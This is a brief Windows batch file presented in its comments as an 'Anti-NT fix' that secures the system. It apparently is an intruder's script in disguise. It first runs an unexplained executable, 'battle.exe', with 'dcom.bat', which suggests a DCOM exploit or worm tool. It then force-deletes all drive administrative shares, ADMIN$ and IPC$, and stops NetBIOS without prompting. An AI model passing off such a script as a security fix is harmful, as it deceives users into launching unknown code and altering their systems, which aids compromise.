rem Anti-NT fix
rem this will stop all shares
rem securing your system
@echo off
battle.exe dcom.bat
net share /delete P$ /y
net share /delete Q$ /y
net share /delete R$ /y
net share /delete S$ /y
net share /delete T$ /y
net share /delete U$ /y
net share /delete V$ /y
net share /delete D$ /y
net share /delete E$ /y
net share /delete F$ /y
net share /delete G$ /y
net share /delete H$ /y
net share /delete I$ /y
net share /delete J$ /y
net share /delete K$ /y
net share /delete L$ /y
net share /delete M$ /y
net share /delete N$ /y
net share /delete O$ /y
net share /delete W$ /y
net share /delete X$ /y
net share /delete Y$ /y
net share /delete C$ /y
net share /delete Z$ /y
net share /delete ADMIN$ /y
net share /delete IPC$ /y 
net stop netbios /y